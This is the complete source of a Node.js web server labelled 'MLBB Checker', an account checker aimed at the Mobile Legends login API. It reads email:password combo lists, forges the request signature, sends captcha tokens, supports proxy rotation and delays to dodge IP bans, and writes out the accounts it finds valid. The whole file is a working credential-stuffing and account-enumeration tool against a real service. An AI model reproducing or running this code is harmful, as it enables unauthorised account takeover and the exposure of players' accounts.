const express = require('express');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const { Worker } = require('worker_threads');
const crypto = require('crypto');
const https = require('https');
const http = require('http');

const app = express();
const upload = multer({ dest: 'uploads/' });

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// API URL
const API_URL = 'https://accountmtapi.mobilelegends.com/';

// Utility functions
function makeSign(email, e_captcha, channel = '', country = '', op = 'email_code_login') {
    const signStr = `channel=${channel}&country=${country}&e_captcha=${e_captcha}&email=${email}&op=${op}`;
    return crypto.createHash('md5').update(signStr, 'utf8').digest('hex');
}

function parseComboLine(line) {
    const parts = line.split(':');
    if (parts.length >= 2) {
        return {
            email: parts[0].trim(),
            password: parts.slice(1).join(':').trim()
        };
    }
    return null;
}

// Single account test endpoint
app.post('/api/test-single', async (req, res) => {
    try {
        const { email, token } = req.body;
        
        if (!email || !token) {
            return res.status(400).json({ error: 'Email and token are required' });
        }
        
        const op = 'email_code_login';
        const sign = makeSign(email, token);
        
        const payload = JSON.stringify({
            op,
            sign,
            params: { email, channel: '', e_captcha: token, country: '' },
            lang: 'en',
        });
        
        const url = new URL(API_URL);
        const isHttps = url.protocol === 'https:';
        
        const options = {
            method: 'POST',
            hostname: url.hostname,
            port: url.port || (isHttps ? 443 : 80),
            path: url.pathname,
            headers: {
                'Origin': 'https://mtacc.mobilelegends.com',
                'Content-Type': 'application/json',
                'Referer': 'https://mtacc.mobilelegends.com/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0',
                'Content-Length': Buffer.byteLength(payload),
            },
            timeout: 30000
        };
        
        const response = await new Promise((resolve, reject) => {
            const client = isHttps ? https : http;
            const req = client.request(options, (res) => {
                let data = '';
                res.on('data', (chunk) => (data += chunk));
                res.on('end', () => {
                    try {
                        resolve(JSON.parse(data));
                    } catch (err) {
                        reject(new Error('Invalid JSON response'));
                    }
                });
            });
            
            req.on('error', (err) => reject(err));
            req.on('timeout', () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });
            
            req.write(payload);
            req.end();
        });
        
        // Handle response
        const { code, message } = response;
        let status, resultMessage;
        
        if (code === 1004 && message === 'Error_NoAccount') {
            status = 'invalid';
            resultMessage = 'No account found';
        } else if (code === 0 && message === 'Error_Success') {
            status = 'valid';
            const redirectUrl = response.redirect || (response.data && response.data.redirect);
            resultMessage = `Success! Redirect: ${redirectUrl}`;
        } else if (code === 1004 && message === 'Error_FailedTooMuch') {
            status = 'error';
            resultMessage = 'Too many failed attempts. IP/Proxy banned';
        } else if (code === 1004 && message === 'Error_ECaptcha_VerifyFail') {
            status = 'error';
            resultMessage = 'Captcha verification failed';
        } else {
            status = 'unknown';
            resultMessage = `Unknown response: ${JSON.stringify(response)}`;
        }
        
        res.json({
            status,
            message: resultMessage,
            email,
            code,
            serverMessage: message
        });
        
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: error.message,
            email: req.body.email
        });
    }
});

// File upload endpoint
app.post('/api/upload', upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        
        const filePath = req.file.path;
        const content = fs.readFileSync(filePath, 'utf8');
        const lines = content.split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);
        
        // Clean up uploaded file
        fs.unlinkSync(filePath);
        
        res.json({
            success: true,
            fileName: req.file.originalname,
            lineCount: lines.length,
            lines: lines
        });
        
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Start checking endpoint
app.post('/api/start-check', async (req, res) => {
    try {
        const { combos, tokens, proxies, settings } = req.body;
        
        if (!combos || combos.length === 0 || !tokens || tokens.length === 0) {
            return res.status(400).json({ error: 'Combos and tokens are required' });
        }
        
        // Start checking in background
        const workerData = {
            combos,
            tokens,
            proxies: proxies || [],
            settings: settings || {
                threadCount: 4,
                delayBetweenRequests: 1000,
                timeout: 30000,
                useProxies: false,
                rotateProxies: false
            }
        };
        
        // Create WebSocket or use polling for real-time updates
        // For simplicity, we'll use polling
        
        res.json({
            success: true,
            message: 'Checking started',
            totalAccounts: combos.length,
            checkId: Date.now().toString()
        });
        
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Batch check endpoint (for worker threads)
app.post('/api/batch-check', async (req, res) => {
    try {
        const { batch, tokens, proxies } = req.body;
        
        const results = [];
        
        for (const combo of batch) {
            const parsed = parseComboLine(combo);
            if (!parsed) {
                results.push({ status: 'error', message: 'Invalid combo format', email: combo });
                continue;
            }
            
            // Use first token for now (in real app, rotate tokens)
            const token = tokens[0] || '';
            
            try {
                const op = 'email_code_login';
                const sign = makeSign(parsed.email, token);
                
                const payload = JSON.stringify({
                    op,
                    sign,
                    params: { email: parsed.email, channel: '', e_captcha: token, country: '' },
                    lang: 'en',
                });
                
                const url = new URL(API_URL);
                const isHttps = url.protocol === 'https:';
                
                const options = {
                    method: 'POST',
                    hostname: url.hostname,
                    port: url.port || (isHttps ? 443 : 80),
                    path: url.pathname,
                    headers: {
                        'Origin': 'https://mtacc.mobilelegends.com',
                        'Content-Type': 'application/json',
                        'Referer': 'https://mtacc.mobilelegends.com/',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0',
                        'Content-Length': Buffer.byteLength(payload),
                    },
                    timeout: 30000
                };
                
                const response = await new Promise((resolve, reject) => {
                    const client = isHttps ? https : http;
                    const req = client.request(options, (res) => {
                        let data = '';
                        res.on('data', (chunk) => (data += chunk));
                        res.on('end', () => {
                            try {
                                resolve(JSON.parse(data));
                            } catch (err) {
                                reject(new Error('Invalid JSON response'));
                            }
                        });
                    });
                    
                    req.on('error', (err) => reject(err));
                    req.on('timeout', () => {
                        req.destroy();
                        reject(new Error('Request timeout'));
                    });
                    
                    req.write(payload);
                    req.end();
                });
                
                const { code, message } = response;
                let status, resultMessage;
                
                if (code === 1004 && message === 'Error_NoAccount') {
                    status = 'invalid';
                    resultMessage = 'No account found';
                } else if (code === 0 && message === 'Error_Success') {
                    status = 'valid';
                    const redirectUrl = response.redirect || (response.data && response.data.redirect);
                    resultMessage = `Success! Redirect: ${redirectUrl}`;
                } else if (code === 1004 && message === 'Error_FailedTooMuch') {
                    status = 'error';
                    resultMessage = 'Too many failed attempts. IP/Proxy banned';
                } else if (code === 1004 && message === 'Error_ECaptcha_VerifyFail') {
                    status = 'error';
                    resultMessage = 'Captcha verification failed';
                } else {
                    status = 'unknown';
                    resultMessage = `Code: ${code}, Message: ${message}`;
                }
                
                results.push({
                    status,
                    message: resultMessage,
                    email: parsed.email,
                    code,
                    serverMessage: message
                });
                
            } catch (error) {
                results.push({
                    status: 'error',
                    message: error.message,
                    email: parsed.email
                });
            }
            
            // Small delay between requests
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        
        res.json({ success: true, results });
        
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Save results endpoint
app.post('/api/save-results', (req, res) => {
    try {
        const { results } = req.body;
        
        if (!results || results.length === 0) {
            return res.status(400).json({ error: 'No results to save' });
        }
        
        const validResults = results.filter(r => r.status === 'valid');
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `results_${timestamp}.txt`;
        
        let content = `MLBB Checker Results - ${new Date().toLocaleString()}\n`;
        content += `Total Checked: ${results.length}\n`;
        content += `Valid: ${validResults.length}\n`;
        content += `Invalid: ${results.filter(r => r.status === 'invalid').length}\n`;
        content += `Errors: ${results.filter(r => r.status === 'error').length}\n\n`;
        
        if (validResults.length > 0) {
            content += 'VALID ACCOUNTS:\n';
            content += '═'.repeat(50) + '\n';
            validResults.forEach(result => {
                content += `${result.email}\n`;
            });
        }
        
        // Save file
        fs.writeFileSync(path.join(__dirname, 'results', filename), content);
        
        res.json({
            success: true,
            filename,
            downloadUrl: `/results/${filename}`
        });
        
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Serve results files
app.use('/results', express.static('results'));

// Create necessary directories
if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');
if (!fs.existsSync('results')) fs.mkdirSync('results');

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`MLBB Checker Server running on port ${PORT}`);
    console.log(`Web interface: http://localhost:${PORT}`);
});